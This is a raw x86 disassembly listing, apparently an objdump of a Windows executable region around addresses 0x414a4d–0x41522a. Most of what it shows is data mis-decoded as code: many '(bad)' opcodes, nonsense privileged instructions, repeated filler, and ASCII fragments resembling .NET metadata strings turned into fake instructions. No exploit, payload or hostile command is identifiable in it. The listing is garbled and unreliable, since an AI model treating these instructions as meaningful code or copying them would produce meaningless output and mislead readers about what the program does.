  414a4d:	dec    ebp
  414a4e:	cs push edi
  414a50:	jae    0x414a90
  414a52:	ins    DWORD PTR es:[edi],dx
  414a53:	ins    BYTE PTR es:[edi],dx
  414a54:	inc    ecx
  414a55:	or     ch,BYTE PTR [edi+0x63]
  414a58:	arpl   WORD PTR [edi+0x57],si
  414a5b:	jae    0x414acd
  414a5d:	push   edx
  414a5e:	jb     0x414ac5
  414a60:	outs   dx,BYTE PTR ds:[esi]
  414a61:	cmp    al,0x73
  414a63:	push   edi
  414a64:	cmp    al,0x75
  414a66:	outs   dx,BYTE PTR ds:[esi]
  414a67:	dec    ebp
  414a68:	gs je  0x414ab8
  414a6b:	arpl   WORD PTR [ebp+0x77],bp
  414a6e:	adc    al,0x53
  414a70:	mul    BYTE PTR [eax]
  414a72:	pop    ebx
  414a73:	inc    esi
  414a74:	and    eax,0x28160400
  414a79:	and    esp,DWORD PTR [ecx*4-0x728de173]
  414a80:	lea    ecx,[ebp-0x1]
  414a86:	(bad)  
  414a87:	(bad)  
  414a88:	(bad)  
  414a89:	(bad)  
  414a8a:	dec    DWORD PTR [ecx]
  414a8c:	push   edi
  414a8d:	mov    edi,0x8b8b8b8b
  414a92:	mov    ecx,DWORD PTR [ebx+0x8b8b8b]
  414a98:	add    BYTE PTR [edx+edi*2-0x82975e1],dh
  414a9f:	jle    0x414a82
  414aa1:	fnsave [eax+0x5998b161]
  414aa7:	sbb    ebx,ebp
  414aa9:	fidivr DWORD PTR [ebx+0x511960ca]
  414aaf:	mov    edx,?
  414ab1:	add    BYTE PTR [eax],al
  414ab3:	lea    ecx,[ebx-0x3ce2e6a2]
  414ab9:	lods   eax,DWORD PTR ds:[esi]
  414aba:	or     BYTE PTR [eax+0x3e],dh
  414abd:	or     DWORD PTR [eax],edi
  414abf:	adc    DWORD PTR [esi-0x44],eax
  414ac2:	pop    edx
  414ac3:	inc    ebx
  414ac4:	push   esi
  414ac5:	sub    al,0x6b
  414ac7:	and    DWORD PTR [eax+eax*8+0xb],0xeccac35a
  414acf:	add    BYTE PTR es:[eax],al
  414ad2:	adc    eax,0x93a9
  414ad7:	jle    0x414a78
  414ad9:	mov    BYTE PTR [eax],al
  414adb:	bswap  ebp
  414add:	pop    ss
  414ade:	fsubrp st(4),st
  414ae0:	xlat   BYTE PTR ds:[ebx]
  414ae1:	icebp  
  414ae2:	shr    BYTE PTR [edx+0x3c18f21d],cl
  414ae8:	xchg   edi,eax
  414ae9:	push   edi
  414aea:	jmp    ebx
  414aec:	jle    0x414b2d
  414aee:	(bad)  
  414aef:	sti    
  414af0:	jo     0x414b4f
  414af2:	ins    DWORD PTR es:[edi],dx
  414af3:	hlt    
  414af4:	(bad)  
  414af5:	(bad)  
  414af6:	punpckhwd mm2,mm3
  414af9:	(bad)  
  414afa:	movaps xmm7,XMMWORD PTR [edx+0x40f0f0f]
  414b01:	add    al,0x4
  414b03:	add    al,0x4
  414b05:	add    al,0x4
  414b07:	add    al,0x4
  414b09:	sub    DWORD PTR [edx+0x5b82d21e],0xd0c836bb
  414b13:	nop
  414b14:	dec    ebp
  414b15:	inc    esi
  414b16:	fsub   QWORD PTR [edi+0x3d1873f4]
  414b1c:	imul   ecx,ebx,0x6b
  414b1f:	and    al,BYTE PTR cs:[eax]
	...
  414b2a:	(bad)  
  414b2b:	dec    DWORD PTR [edx]
  414b2d:	cwde   
  414b2e:	fild   QWORD PTR [ebp-0x2c4d0001]
  414b34:	(bad)  
  414b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b36:	retf   
  414b37:	sub    eax,0xf7f4b9ea
  414b3c:	sub    dl,bh
  414b3e:	or     al,0xe6
  414b40:	call   0xcb7e7db5
  414b45:	hlt    
  414b46:	rol    DWORD PTR ds:0xaf6afe9e,0xc
  414b4d:	ins    DWORD PTR es:[edi],dx
  414b4e:	push   edi
  414b4f:	in     eax,0xcb
  414b51:	nop
  414b52:	(bad)  
  414b53:	(bad)  [esi-0x5c380001]
  414b59:	(bad)  
  414b5a:	dec    DWORD PTR [edi+0x4d]
  414b5d:	sar    bh,cl
  414b5f:	call   0xe022100b
  414b64:	icebp  
  414b65:	pmaxub mm5,mm4
  414b68:	push   ds
  414b69:	push   ecx
  414b6a:	jmp    0x414b88
  414b6c:	jle    0x414b61
  414b6e:	popf   
  414b6f:	retf   0x5291
  414b72:	pop    ds
  414b73:	stos   DWORD PTR es:[edi],eax
  414b74:	xor    dl,cl
  414b76:	jge    0x414bab
  414b78:	call   0x804b3465
  414b7d:	out    0x9a,al
  414b7f:	add    al,0x7d
  414b81:	rol    BYTE PTR [edx+0x6f],1
  414b84:	mov    DWORD PTR es:[ebp+0x6c],esp
  414b88:	in     al,0x85
  414b8a:	jns    0x414b66
  414b8c:	lock cmp bh,bh
  414b8f:	dec    esp
  414b90:	jmp    0x69577819
  414b95:	int3   
  414b96:	daa    
  414b97:	loope  0x414b81
  414b99:	call   0xe8cc25a2
  414b9e:	call   0x414c8b
  414ba3:	add    BYTE PTR [eax],al
  414ba5:	add    BYTE PTR [eax],al
  414ba7:	add    BYTE PTR [eax],al
  414ba9:	outs   dx,DWORD PTR ds:[esi]
  414baa:	cli    
  414bab:	out    0x0,al
	...
  414bb5:	rol    al,0x1c
  414bb8:	add    al,0xb8
  414bba:	sbb    ebp,ebx
  414bbc:	add    BYTE PTR [esp+eiz*2-0x74a26e9d],dh
  414bc3:	aam    0xbb
  414bc5:	loop   0x414c02
  414bc7:	dec    ecx
  414bc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bc9:	pop    eax
  414bca:	ins    BYTE PTR es:[edi],dx
  414bcb:	in     al,dx
  414bcc:	xchg   ebp,eax
  414bcd:	pop    es
  414bce:	sub    eax,eax
  414bd0:	shl    BYTE PTR [ebx-0x173f3f09],0x73
  414bd7:	rol    al,0xe1
  414bda:	dec    edi
  414bdb:	push   0x2b4bbe72
  414be0:	pop    ebp
  414be1:	cmp    DWORD PTR [ebp-0x54],edx
  414be4:	cmp    eax,0x6163282c
  414be9:	xor    bh,BYTE PTR [edx+0x31891852]
  414bef:	not    BYTE PTR [eax]
  414bf1:	ror    BYTE PTR [ebx+0x3332d5db],0x8b
  414bf8:	mov    ecx,DWORD PTR [ebx+0x73465804]
  414bfe:	(bad)  
  414c00:	inc    esi
  414c01:	dec    eax
  414c02:	test   DWORD PTR [ecx-0x24],ecx
  414c05:	mul    DWORD PTR [ecx-0x1e075f32]
  414c0b:	packssdw mm2,mm0
  414c0e:	pop    ebx
  414c0f:	mov    eax,0xcc6f5733
  414c14:	(bad)  
  414c15:	pop    ecx
  414c16:	leave  
  414c17:	ret    0xdfaa
  414c1a:	mov    cs,WORD PTR [ebx+0x2e8b8ba7]
  414c20:	das    
  414c21:	mov    ecx,DWORD PTR [ebx-0x76767675]
  414c27:	mov    DWORD PTR [ecx-0x76767677],ecx
  414c2d:	(bad)  
  414c2e:	sub    BYTE PTR [ebx+0x0],ah
	...
  414c39:	add    BYTE PTR [eax],al
  414c3b:	or     eax,0x63bcb0c
  414c40:	sbb    eax,0x554460b9
  414c45:	mov    ebp,0x53313b09
  414c4a:	sub    bh,BYTE PTR [ebp+eax*1+0x11]
  414c4e:	mov    dl,0x4
  414c50:	mov    ds:0xaddb,eax
  414c55:	jmp    0x5857904a
  414c5a:	or     DWORD PTR [ecx-0x602dcce5],eax
  414c60:	out    dx,al
  414c61:	xchg   DWORD PTR [ebp+0x40acc6d7],edx
  414c67:	in     eax,0xb6
  414c69:	xor    dh,al
  414c6b:	xor    DWORD PTR [ecx-0x5e],ecx
  414c6e:	push   edi
  414c6f:	mov    ch,0xcf
  414c71:	push   ebp
  414c72:	add    BYTE PTR [eax],al
  414c74:	push   ds
  414c75:	jl     0x414c2f
  414c77:	add    BYTE PTR [eax],al
  414c79:	adc    DWORD PTR [ebx+0x32000059],ecx
  414c7f:	dec    ecx
  414c80:	and    DWORD PTR [edi-0x79],0xf52863f8
  414c87:	mov    dh,0xda
  414c89:	xchg   ebx,eax
  414c8a:	out    dx,al
  414c8b:	cmp    edx,DWORD PTR [ebp+0x56]
  414c8e:	dec    edi
  414c8f:	xchg   ebp,eax
  414c90:	outs   dx,BYTE PTR ds:[esi]
  414c91:	idiv   BYTE PTR [ebp+0xdd2905]
  414c97:	add    BYTE PTR [eax],al
  414c99:	ret    
  414c9a:	jecxz  0x414c9c
  414c9c:	add    BYTE PTR [esi+0x75],cl
	...
  414cab:	pop    ecx
  414cac:	addr16 test eax,0x7dbabcfb
  414cb2:	xchg   edx,eax
  414cb3:	add    DWORD PTR [ecx-0x15b242ee],edi
  414cb9:	pop    edi
  414cba:	adc    dl,BYTE PTR [eax]
  414cbc:	cli    
  414cbd:	in     eax,dx
  414cbe:	inc    esi
  414cbf:	pop    esi
  414cc0:	pop    DWORD PTR [ecx-0x2f]
  414cc6:	(bad)  
  414cc7:	(bad)  
  414cc8:	(bad)  
  414cc9:	(bad)  
  414cca:	(bad)  
  414ccb:	inc    DWORD PTR [eax]
  414ccd:	add    dh,ch
  414ccf:	cmp    ecx,DWORD PTR [esi]
  414cd1:	add    al,BYTE PTR [eax]
  414cd3:	add    BYTE PTR [ebx],bl
  414cd5:	jnp    0x414ceb
  414cd7:	mov    edi,0x263626c
  414cdc:	adc    BYTE PTR [edx],dl
  414cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cdf:	mov    ecx,0x1b33372e
  414ce4:	test   al,0x97
  414ce6:	aaa    
  414ce7:	mov    dh,0xeb
  414ce9:	stos   BYTE PTR es:[edi],al
  414cea:	adc    ebx,DWORD PTR [ebp+0xa]
  414ced:	jns    0x414d0e
  414cef:	addr16 out 0xcf,al
  414cf2:	add    ch,BYTE PTR [esi+esi*8+0x51e1]
  414cf9:	out    0x6f,eax
  414cfb:	add    BYTE PTR [eax],al
  414cfd:	mov    bh,0x9a
  414cff:	xchg   esi,eax
  414d00:	add    BYTE PTR [ebx-0x2e1409fc],al
  414d06:	adc    ecx,edx
  414d08:	inc    eax
  414d09:	enter  0x48c6,0x15
  414d0d:	jg     0x414d53
  414d0f:	ret    0xc517
  414d12:	rol    DWORD PTR [esi+0x74445acf],0x72
  414d19:	in     al,dx
  414d1a:	add    DWORD PTR [ebx+0x22647d83],0xffffff9b
  414d21:	sub    al,dl
  414d23:	aad    0x9b
  414d25:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  414d27:	retf   0xcb2
  414d2a:	jne    0x414d30
  414d2c:	push   esp
  414d2d:	push   ss
  414d2e:	into   
  414d2f:	pushf  
  414d30:	ret    0x30f1
  414d33:	stos   BYTE PTR es:[edi],al
  414d34:	outs   dx,DWORD PTR ds:[esi]
  414d35:	cli    
  414d36:	mov    esp,0x83b99ce1
  414d3b:	adc    DWORD PTR [edi-0x7c7c6db5],0xffffff83
	...
  414d4a:	add    BYTE PTR [edi-0x5b],bl
  414d4d:	fld    DWORD PTR [eax]
	...
  414d57:	mov    ecx,DWORD PTR [ebx-0x22ff5642]
  414d5d:	call   edi
  414d5f:	cmc    
  414d60:	loope  0x414d87
  414d62:	mov    dl,BYTE PTR [edx]
  414d64:	pop    ecx
  414d65:	push   es
  414d66:	xlat   BYTE PTR ds:[ebx]
  414d67:	sub    BYTE PTR [edx-0x2d],ah
  414d6a:	pop    esi
  414d6b:	jge    0x414d19
  414d6d:	ror    DWORD PTR [ebp-0x5],cl
  414d70:	jle    0x414cfd
  414d72:	mov    esi,DWORD PTR [ebp+0x55]
  414d75:	mov    ecx,DWORD PTR [ebx-0x7474a801]
  414d7b:	mov    edx,0x903ac151
  414d80:	(bad)  
  414d81:	out    dx,al
  414d82:	cmp    DWORD PTR [eax+edx*1+0x58],ebp
  414d86:	outs   dx,DWORD PTR ds:[esi]
  414d87:	or     ecx,0x3
  414d8a:	(bad)  
  414d8b:	xor    al,0x1d
  414d8d:	mov    bh,0xc0
  414d8f:	xchg   ebp,eax
  414d90:	dec    eax
  414d91:	push   esi
  414d92:	fisttp WORD PTR [ebx+0x5141cb00]
  414d98:	ja     0x414d9a
  414d9a:	add    BYTE PTR [eax],al
  414d9c:	fcomp  st(3)
  414d9e:	adc    edi,ebx
  414da0:	mov    al,0xd7
  414da2:	clc    
  414da3:	pop    es
  414da4:	scas   al,BYTE PTR es:[edi]
  414da5:	adc    al,0x26
  414da7:	daa    
  414da8:	push   0xeb7c6654
  414dad:	sub    al,0x65
  414daf:	xchg   esp,eax
  414db0:	(bad)  
  414db1:	mov    ds:0x65041010,al
  414db6:	add    ebx,DWORD PTR [edx-0x7a4e6a2b]
  414dbc:	mov    eax,ds:0x4373414b
  414dc1:	or     al,BYTE PTR [ebx+0x74]
  414dc4:	or     dh,BYTE PTR cs:[edx+0x54]
  414dc8:	jb     0x414e3c
  414dca:	and    BYTE PTR [ecx+0x6d],ah
  414dcd:	bound  ebp,QWORD PTR [ebp+0x43]
  414dd0:	and    BYTE PTR [esi+0x20],ah
  414dd3:	popa   
  414dd4:	arpl   WORD PTR [edi+0x72],bp
  414dd7:	inc    esp
  414dd8:	or     ch,BYTE PTR [edi]
  414dda:	and    BYTE PTR [ebx+0x43],dl
  414ddd:	gs arpl WORD PTR cs:[ecx+0x72],sp
  414de2:	jne    0x414e28
  414de4:	cs ins DWORD PTR es:[edi],dx
  414de6:	inc    esp
  414de7:	and    BYTE PTR [ebp+0x63],ch
  414dea:	and    BYTE PTR [ebx+0x6c],ah
  414ded:	bound  esp,QWORD PTR [ebp+0x73]
  414df0:	push   ebx
  414df1:	jo     0x414e46
  414df3:	jbe    0x414e23
  414df5:	jo     0x414e5e
  414df7:	outs   dx,DWORD PTR ds:[esi]
  414df8:	jb     0x414e5f
  414dfa:	cs gs jae 0x414e77
  414dfe:	outs   dx,BYTE PTR ds:[esi]
  414dff:	inc    esp
  414e00:	ja     0x414e75
  414e02:	addr16 dec ebp
  414e04:	gs jb  0x414e74
  414e07:	bound  eax,QWORD PTR gs:[ecx+0x65]
  414e0b:	inc    ecx
  414e0c:	ins    DWORD PTR es:[edi],dx
  414e0d:	ins    DWORD PTR es:[edi],dx
  414e0e:	or     eax,0x2061532e
  414e13:	inc    ebx
  414e14:	push   edi
  414e15:	gs gs push edx
  414e18:	bound  esp,QWORD PTR [edx+0x70]
  414e1b:	and    ah,BYTE PTR [eax]
  414e1d:	addr16 data16 jns 0x414e8e
  414e21:	je     0x414e4f
  414e23:	push   0x4165732e
  414e28:	arpl   WORD PTR [edx+0x6d],si
  414e2b:	jb     0x414e92
  414e2d:	push   ebx
  414e2e:	cs ds or eax,0x6e652e65
  414e35:	sub    BYTE PTR [ebx+0x6f],dh
  414e38:	imul   ebp,DWORD PTR [ebp+0x3c],0x96d42
  414e3f:	add    BYTE PTR [ecx+0xaa],ch
  414e45:	(bad)  
  414e46:	(bad)  
  414e47:	(bad)  
  414e48:	(bad)  
  414e49:	(bad)  
  414e4a:	(bad)  
  414e4b:	(bad)  
  414e4c:	(bad)  
  414e4d:	(bad)  
  414e4e:	fsub   QWORD PTR [ebp-0x17171728]
  414e54:	call   0xe92a3741
  414e59:	call   0xa8e4d1e1
  414e5e:	sub    BYTE PTR [edx-0x3152a2b9],dl
  414e64:	enter  0x75bc,0x5f
  414e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e69:	pop    edx
  414e6a:	loop   0x414e46
  414e6c:	mov    cl,0x4e
  414e6e:	push   es
  414e6f:	ss push es
  414e71:	fcomi  st,st(4)
  414e73:	sbb    DWORD PTR [ebx-0x4de31b7d],eax
  414e79:	test   ebx,ecx
  414e7b:	pmullw mm5,mm3
  414e7e:	jle    0x414e0b
  414e80:	fcom   DWORD PTR [edi+0x1c]
  414e83:	jnp    0x414ec3
  414e85:	dec    eax
  414e86:	xchg   ecx,eax
  414e87:	inc    ebx
  414e88:	xchg   BYTE PTR [ecx-0x7e],ah
  414e8b:	push   esp
  414e8c:	retf   
  414e8d:	sar    DWORD PTR [esi],cl
  414e8f:	fsubr  DWORD PTR [ecx]
  414e91:	sub    esi,DWORD PTR [ebx]
  414e93:	add    DWORD PTR [ebx-0x7c8d4675],0xffffff83
  414e9a:	and    dh,BYTE PTR [edi+0x330083eb]
  414ea0:	retf   0xb4ba
  414ea3:	bound  esp,QWORD PTR [ecx]
  414ea5:	jmp    0x414e46
  414ea7:	and    eax,0x262b02aa
  414eac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ead:	nop
  414eae:	sbb    ebp,DWORD PTR [esi+0x3c]
  414eb1:	nop
  414eb2:	aaa    
  414eb3:	iret   
  414eb4:	sbb    edx,esp
  414eb6:	add    BYTE PTR gs:[eax],al
  414eb9:	add    BYTE PTR [eax+0x38],bl
  414ebc:	add    BYTE PTR [eax],al
  414ebe:	imul   esp,DWORD PTR [edx],0x0
  414ec1:	add    BYTE PTR [eax],al
  414ec3:	(bad)  
  414ec4:	(bad)  
  414ec5:	(bad)  
  414ec6:	(bad)  
  414ec7:	(bad)  
  414ec8:	(bad)  
  414ec9:	(bad)  
  414eca:	(bad)  
  414ecb:	pxor   mm0,QWORD PTR [ebp+0xf]
  414ecf:	fidiv  WORD PTR [edx-0xc]
  414ed2:	push   eax
  414ed3:	mov    al,ds:0xbbc2ace2
  414ed8:	and    ebx,edx
  414eda:	push   ebx
  414edb:	add    ecx,DWORD PTR [esi]
  414edd:	mov    BYTE PTR [eax-0x3e1965ee],al
  414ee3:	xor    al,0x0
	...
  414eed:	add    BYTE PTR [eax],al
  414eef:	(bad)  
  414ef0:	int    0x7c
  414ef2:	inc    DWORD PTR [eax]
  414ef4:	add    ah,ah
  414ef6:	xor    ch,BYTE PTR [ecx+0x4c]
  414ef9:	ret    
  414efa:	fdiv   st(4),st
  414efc:	lods   al,BYTE PTR ds:[esi]
  414efd:	repz jne 0x414ed5
  414f00:	jle    0x414ebb
  414f02:	das    
  414f03:	sbb    eax,0x13b886a7
  414f08:	dec    esp
  414f09:	sar    BYTE PTR [eax-0x2031ca86],1
  414f0f:	hlt    
  414f10:	mov    bl,BYTE PTR [esi]
  414f12:	ss aaa 
  414f14:	repnz mov dh,0xea
  414f17:	push   0x0
  414f19:	add    BYTE PTR [ebx-0x2dffff26],ch
  414f1f:	sub    BYTE PTR [edi],bh
  414f21:	add    bh,bh
  414f23:	ret    
  414f24:	xlat   BYTE PTR ds:[ebx]
  414f25:	jnp    0x414f77
  414f27:	into   
  414f28:	jmp    0x46ee:0x2b5dfcf4
  414f2f:	fistp  QWORD PTR [ebx+edx*8+0x13]
  414f33:	or     DWORD PTR [eax-0x56],eax
  414f36:	aaa    
  414f37:	jnp    0x414f26
  414f39:	mov    WORD PTR [edi-0x1],cs
  414f3c:	(bad)  
  414f3d:	(bad)  
  414f3e:	call   0x4e913a11
  414f43:	jne    0x414f9c
  414f45:	test   BYTE PTR [esi],0xc1
  414f48:	pxor   mm6,QWORD PTR [edi+ebx*2]
  414f4c:	je     0x414f04
  414f4e:	add    esi,DWORD PTR [edx]
  414f50:	ins    BYTE PTR es:[edi],dx
  414f51:	iret   
  414f52:	cmc    
  414f53:	mov    ebp,0x5d34ab69
  414f58:	pop    edi
  414f59:	push   es
  414f5a:	inc    edi
  414f5b:	(bad)  
  414f5c:	inc    DWORD PTR [ecx]
  414f5e:	and    dl,BYTE PTR [edi+edi*8-0x72720001]
  414f65:	lea    ecx,[ebp-0x72727273]
  414f6b:	(bad)  
  414f6c:	jmp    0x41bd10
  414f71:	add    BYTE PTR [eax],al
  414f73:	add    BYTE PTR [eax],al
  414f75:	add    BYTE PTR [eax],al
  414f77:	add    BYTE PTR [ebx-0x5dea3f75],cl
  414f7d:	xchg   ebx,eax
  414f7e:	inc    eax
  414f7f:	push   cs
  414f80:	pop    edx
  414f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f82:	jg     0x414f47
  414f84:	out    0x57,ax
  414f87:	lahf   
  414f88:	(bad)  
  414f8a:	and    eax,0x6d149fe2
  414f8f:	mov    ch,0x15
  414f91:	test   DWORD PTR [ebx-0x74d37a75],ecx
  414f97:	mov    ecx,DWORD PTR [ecx+0x41]
  414f9a:	mov    ecx,DWORD PTR [ebx+0x5415fb6d]
  414fa0:	dec    ecx
  414fa1:	sbb    eax,0xab806d9d
  414fa6:	mov    bh,0x16
  414fa8:	in     eax,dx
  414fa9:	mov    eax,ds:0xe142dcb
  414fae:	lds    eax,FWORD PTR [ebp-0x53]
  414fb1:	pop    ebp
  414fb2:	add    BYTE PTR [esi-0x75],ch
  414fb5:	test   eax,eax
  414fb7:	sub    al,BYTE PTR [edi]
  414fb9:	fadd   QWORD PTR [ebp-0x78267a7b]
  414fbf:	fldenv [ebx]
  414fc1:	inc    ecx
  414fc2:	pushw  cs
  414fc4:	mov    edi,0xf4d40b05
  414fc9:	icebp  
  414fca:	fst    st(4)
  414fcc:	and    BYTE PTR ds:0x347723d9,0xe0
  414fd3:	add    eax,0x915036
  414fd8:	fbld   TBYTE PTR [ebx+esi*1+0x4fe87b75]
  414fdf:	fld    DWORD PTR [ebp-0x7af2557b]
  414fe5:	test   DWORD PTR [ebp-0x76767677],eax
  414feb:	mov    DWORD PTR [ecx+0x5a898989],ecx
  414ff1:	addr16 fwait
  414ff3:	call   0xe92a38e0
  414ff8:	call   0x8e2a38e5
  414ffd:	(bad)  
  414ffe:	ficom  DWORD PTR [eax+0x61b91e16]
  415004:	xchg   ecx,eax
  415005:	push   eax
  415006:	ror    DWORD PTR [edi-0xdaa7e8e],1
  41500c:	ins    BYTE PTR es:[edi],dx
  41500d:	loope  0x414f9b
  41500f:	test   ecx,eax
  415011:	push   es
  415012:	xor    BYTE PTR [ebp-0x72723e4b],ah
  415018:	or     dl,BYTE PTR [eax+0x50]
  41501b:	mov    ch,0x29
  41501d:	in     al,0xc3
  41501f:	loopne 0x414fe0
  415021:	adc    ah,cl
  415023:	and    BYTE PTR [esi+edi*4],bh
  415026:	(bad)  
  415027:	pop    edi
  415028:	inc    esi
  415029:	aaa    
  41502a:	and    al,0x5c
  41502c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41502d:	fistp  QWORD PTR [esi+0x173560e7]
  415033:	xor    eax,0x78d8ddb
  415038:	xchg   ecx,eax
  415039:	and    eax,0x6e08d8d
  41503e:	jae    0x414fcd
  415040:	jne    0x4150bd
  415042:	stos   BYTE PTR es:[edi],al
  415043:	mov    eax,0x65f46673
  415048:	scas   eax,DWORD PTR es:[edi]
  415049:	add    al,0x0
  41504b:	nop
  41504c:	iret   
  41504d:	push   0xffffffe0
  41504f:	pop    esi
  415050:	popf   
  415051:	ret    0x5ebb
  415054:	mov    ebp,0x5195cff6
  415059:	jne    0x4150d0
  41505b:	jne    0x415024
  41505d:	xlat   BYTE PTR ds:[ebx]
  41505e:	jne    0x4150d5
  415060:	loope  0x415032
  415062:	jne    0x4150d9
  415064:	jne    0x4150db
  415066:	jne    0x4150dd
  415068:	jne    0x4150df
  41506a:	jne    0x4150e1
  41506c:	jne    0x4150e3
  41506e:	xchg   ebx,eax
  41506f:	pusha  
  415070:	call   DWORD PTR [esi]
  415072:	in     eax,dx
  415073:	mov    bh,0x94
  415075:	jnp    0x4150e4
  415077:	fwait
  415078:	adc    ch,dl
  41507a:	jecxz  0x4150b5
  41507c:	mov    ecx,0xbc70d96b
  415081:	out    0xf2,eax
  415083:	mov    ebp,DWORD PTR [esi+ebp*8+0x0]
	...
  41508f:	add    BYTE PTR [eax],al
  415091:	scas   al,BYTE PTR es:[edi]
  415092:	add    BYTE PTR [eax+edi*8+0x2a3b0000],dl
  415099:	outs   dx,BYTE PTR ds:[esi]
  41509a:	repz jno 0x415096
  41509d:	sub    bh,cl
  41509f:	push   edi
  4150a0:	ins    DWORD PTR es:[edi],dx
  4150a1:	xchg   esi,eax
  4150a2:	jno    0x415066
  4150a4:	ins    DWORD PTR es:[edi],dx
  4150a5:	inc    esi
  4150a6:	idiv   ebp
  4150a8:	ja     0x4150df
  4150aa:	sub    BYTE PTR [edx-0x480b0966],al
  4150b0:	pusha  
  4150b1:	out    dx,eax
  4150b2:	jmp    0x9022:0x6511426a
  4150b9:	inc    edi
  4150ba:	add    BYTE PTR [eax],al
  4150bc:	xor    al,BYTE PTR [eax+0x0]
  4150bf:	add    bl,ch
  4150c1:	mov    edx,0xde0000cf
  4150c6:	xchg   ebp,eax
  4150c7:	retf   0xbd97
  4150ca:	pop    edi
  4150cb:	sub    bh,BYTE PTR [eax]
  4150cd:	mov    esp,DWORD PTR [eax+0x2b086fc9]
  4150d3:	sbb    eax,0x7475bca7
  4150d8:	pop    esp
  4150d9:	add    BYTE PTR [ecx],0xd6
  4150dc:	out    0x0,al
  4150de:	add    BYTE PTR [eax],al
  4150e0:	scas   al,BYTE PTR es:[edi]
  4150e1:	retf   
  4150e2:	(bad)  
  4150e3:	cli    
  4150e4:	mov    ebx,0xc0b4f20e
  4150e9:	add    BYTE PTR [ebx-0x4df5ffcf],dh
  4150ef:	or     DWORD PTR [ecx+0xc4b4f06],edx
  4150f5:	add    cl,BYTE PTR [edx+0x3e]
  4150f8:	mov    al,ds:0xf5b0c4d9
  4150fd:	add    BYTE PTR [eax],al
  4150ff:	addr16 out dx,eax
  415101:	mov    ah,0x0
  415103:	add    BYTE PTR [eax],al
  415105:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41510b:	mov    ecx,DWORD PTR [ebx+0x25b3fb8b]
	...
  415119:	add    BYTE PTR [esp+ecx*1],cl
  41511c:	jle    0x4150c6
  41511e:	dec    edi
  41511f:	mov    al,ds:0x5e0e8a9e
  415124:	xor    DWORD PTR [eax],0x3e
  415127:	nop
  415128:	lods   al,BYTE PTR ds:[esi]
  415129:	test   dh,bl
  41512b:	inc    esp
  41512c:	xchg   ebx,ebp
  41512e:	mov    ebp,0xae91f278
  415133:	js     0x415141
  415135:	or     al,0xee
  415137:	xor    al,0xc
  415139:	or     al,0xd2
  41513b:	pop    eax
  41513c:	or     al,0xc
  41513e:	(bad)  
  41513f:	sub    eax,0x316e4140
  415144:	retf   
  415145:	pop    ecx
  415146:	retf   0xc9f4
  415149:	lea    eax,[edx+0x1e]
  41514c:	xor    al,0xd8
  41514e:	shl    DWORD PTR [eax+0x27],1
  415151:	inc    ecx
  415152:	js     0x4151c8
  415154:	sub    edx,edi
  415156:	or     al,0x8b
  415158:	(bad)  
  415159:	jbe    0x4150dc
  41515b:	xchg   ebx,eax
  41515c:	mov    ecx,DWORD PTR [ebx+0x40d6758b]
  415162:	jg     0x415109
  415164:	xlat   BYTE PTR ds:[ebx]
  415165:	xchg   ebx,eax
  415166:	dec    edi
  415167:	dec    esp
  415168:	inc    ebp
  415169:	xor    al,0x5d
  41516b:	in     eax,dx
  41516c:	test   BYTE PTR [edx],ch
  41516e:	sbb    ebx,eax
  415170:	xor    ecx,ebp
  415172:	or     al,0x6a
  415174:	clc    
  415175:	push   0xeb960e3a
  41517a:	(bad)
  41517e:	xchg   edx,eax
  41517f:	push   0x8b8bb513
  415184:	add    eax,edx
  415186:	mov    ecx,DWORD PTR [ebx+0x7474748b]
  41518c:	je     0x415202
  41518e:	je     0x415204
  415190:	je     0x415206
  415192:	xchg   BYTE PTR fs:[esi-0x74747475],dl
  415199:	mov    ecx,DWORD PTR [ebx+0x758b8b8b]
  41519f:	jne    0x41514f
  4151a1:	inc    ebx
  4151a2:	sbb    eax,0xaef71971
  4151a7:	lea    ebx,ds:0x89878748
  4151ad:	pop    es
  4151ae:	jmp    0xc75045e5
  4151b3:	ja     0x4151a7
  4151b5:	aad    0x7b
  4151b7:	mov    ds:0x49df7575,al
  4151bc:	mov    bl,0x12
  4151be:	call   FWORD PTR [ebx]
  4151c0:	dec    ecx
  4151c1:	inc    esp
  4151c2:	jbe    0x415144
  4151c4:	cli    
  4151c5:	fbld   TBYTE PTR [eax]
  4151c7:	xchg   ecx,eax
  4151c8:	mov    bl,0xc0
  4151ca:	cli    
  4151cb:	or     al,0xfa
  4151cd:	clc    
  4151ce:	aam    0x9a
  4151d0:	ror    DWORD PTR [ebp+esi*8-0xe20a96d],cl
  4151d7:	jne    0x41524e
  4151d9:	mov    eax,0x75757cc3
  4151de:	or     ah,BYTE PTR [ebx-0x1338ae5]
  4151e4:	sti    
  4151e5:	(bad)  
  4151e6:	xlat   BYTE PTR ds:[ebx]
  4151e7:	in     eax,dx
  4151e8:	dec    ebp
  4151e9:	jg     0x415223
  4151eb:	mov    WORD PTR [eax+ebx*2+0xd],?
  4151ef:	outs   dx,DWORD PTR ds:[esi]
  4151f0:	gs dec ebp
  4151f2:	arpl   WORD PTR [edx],di
  4151f4:	and    BYTE PTR [eax+0x69],dh
  4151f7:	ins    BYTE PTR es:[edi],dx
  4151f8:	gs outs dx,DWORD PTR gs:[esi]
  4151fb:	jae    0x415254
  4151fd:	arpl   WORD PTR gs:[esi+0x72],bp
  415201:	dec    ebp
  415202:	gs gs ins DWORD PTR es:[edi],dx
  415205:	gs ins DWORD PTR es:[edi],dx
  415207:	outs   dx,BYTE PTR ds:[esi]
  415208:	and    ch,BYTE PTR [ebp+0x62]
  41520b:	arpl   WORD PTR [esi+0x65],si
  41520e:	push   ebx
  41520f:	jae    0x415280
  415211:	gs ins DWORD PTR es:[edi],dx
  415213:	arpl   WORD PTR [esi],bp
  415215:	arpl   WORD PTR [edx],sp
  415217:	and    BYTE PTR [esi+0x4d],ah
  41521a:	and    BYTE PTR [esi],ch
  41521c:	jb     0x415240
  41521e:	sub    DWORD PTR [ebp+eiz*2+0x2e],esi
  415222:	imul   eax,DWORD PTR [ecx+0x6d],0x656d756d
  415229:	inc    ecx
  41522a:	gs cmp eax,0x6e20203c
